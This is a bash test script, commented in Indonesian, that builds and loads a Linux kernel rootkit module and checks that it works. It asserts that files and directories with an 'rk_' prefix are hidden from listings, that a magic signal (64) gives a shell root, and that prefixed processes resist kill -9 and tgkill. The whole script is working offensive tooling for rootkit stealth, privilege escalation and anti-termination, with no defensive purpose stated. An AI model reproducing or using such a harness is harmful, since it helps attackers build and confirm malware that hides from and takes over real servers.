#!/usr/bin/env bash
# test.sh — uji rootkit di VPS (butuh root + kernel headers).
#
# Setiap langkah punya assertion dan exit non-zero bila gagal. Versi lama hanya
# mencetak perintah tanpa memeriksa hasil, sehingga "lulus" walau modul tidak
# termuat atau hiding tidak bekerja.
#
#   sudo ./test.sh            # build + load(hide_module=0) + semua uji
#   sudo ./test.sh build      # hanya build
#   sudo ./test.sh load|unload
set -uo pipefail
cd "$(dirname "$0")"

KO="rootkit.ko"
PREFIX="rk_"
MAGIC=64
fail=0

pass() { echo "  PASS: $*"; }
bad()  { echo "  FAIL: $*"; fail=1; }

need_root() {
  [ "$(id -u)" = "0" ] || { echo "butuh root: sudo ./test.sh"; exit 1; }
}

loaded() { lsmod | grep -q "^rootkit "; }

do_build() {
  echo "[test] build ($(uname -r))"
  if make; then pass "build modul"; else bad "build modul"; return 1; fi
}

do_load() {
  need_root
  if loaded; then rmmod rootkit || true; fi
  if insmod "$KO" hide_prefix="$PREFIX" proc_prefix="$PREFIX" \
       sig_magic="$MAGIC" sig_unhide=63 hide_module=0; then
    pass "insmod"
  else
    bad "insmod"; return 1
  fi
}

do_unload() {
  need_root
  if loaded; then
    if rmmod rootkit; then pass "rmmod"; else bad "rmmod"; fi
  else
    pass "modul memang tidak loaded"
  fi
}

do_checks() {
  need_root
  loaded || { bad "modul tidak loaded"; return 1; }

  # --- hide file/dir dari listing ---
  rm -rf "/tmp/${PREFIX}check_dir" "/tmp/${PREFIX}check_file"
  mkdir "/tmp/${PREFIX}check_dir"
  touch "/tmp/${PREFIX}check_dir/x" "/tmp/${PREFIX}check_file" /tmp/rkcheck_visible
  if ls /tmp | grep -q "${PREFIX}check_file"; then bad "file ${PREFIX}* masih terlihat"; else pass "file ${PREFIX}* disembunyikan"; fi
  if ls /tmp | grep -q "${PREFIX}check_dir"; then bad "direktori ${PREFIX}* masih terlihat"; else pass "direktori ${PREFIX}* disembunyikan"; fi
  if ls /tmp | grep -q rkcheck_visible; then pass "file normal tetap terlihat"; else bad "file normal ikut hilang"; fi

  # --- privesc ---
  if [ "$(bash -c "kill -$MAGIC \$\$; id -u" 2>/dev/null)" = "0" ]; then
    pass "privesc: id -u = 0"
  else
    bad "privesc tidak bekerja"
  fi

  # --- anti-kill (SIGKILL + tgkill) ---
  cp /bin/sleep "/tmp/${PREFIX}sleep"
  "/tmp/${PREFIX}sleep" 10 </dev/null >/dev/null 2>&1 &
  local p=$!
  sleep 0.5
  if ! kill -0 "$p" 2>/dev/null; then
    bad "proses uji sudah mati (ESRCH)"
  else
    local msg
    msg="$(kill -9 "$p" 2>&1)" || true
    if printf '%s' "$msg" | grep -qi "not permitted"; then
      pass "kill -9 ditolak EPERM"
    else
      bad "kill -9 tidak ditolak (msg='${msg}')"
    fi
    # tgkill tidak lewat hook kill: harus ikut diproteksi
    if command -v python3 >/dev/null; then
      msg="$(python3 -c "import os,signal,sys; os.kill($p, signal.SIGKILL)" 2>&1)" || true
      if printf '%s' "$msg" | grep -qi "not permitted"; then
        pass "os.kill (tgkill) juga ditolak"
      else
        bad "os.kill (tgkill) lolos (msg='${msg}')"
      fi
    fi
    kill -INT "$p" 2>/dev/null
    for _ in 1 2 3 4 5; do kill -0 "$p" 2>/dev/null || break; sleep 0.2; done
    kill -9 "$p" 2>/dev/null
    wait "$p" 2>/dev/null
  fi

  rm -rf "/tmp/${PREFIX}check_dir" "/tmp/${PREFIX}check_file" "/tmp/${PREFIX}sleep" /tmp/rkcheck_visible
}

case "${1:-all}" in
  build) do_build ;;
  load) do_load ;;
  unload) do_unload ;;
  all)
    do_build || true
    if [ "$fail" -eq 0 ] && [ "$(id -u)" = "0" ]; then
      do_load && do_checks && do_unload
    else
      echo "[test] lewati uji kernel (butuh root)"
    fi
    ;;
  *) echo "pakai: $0 [all|build|load|unload]"; exit 2 ;;
esac

if [ "$fail" -eq 0 ]; then
  echo "RESULT: PASS"
  exit 0
else
  echo "RESULT: FAIL"
  exit 1
fi
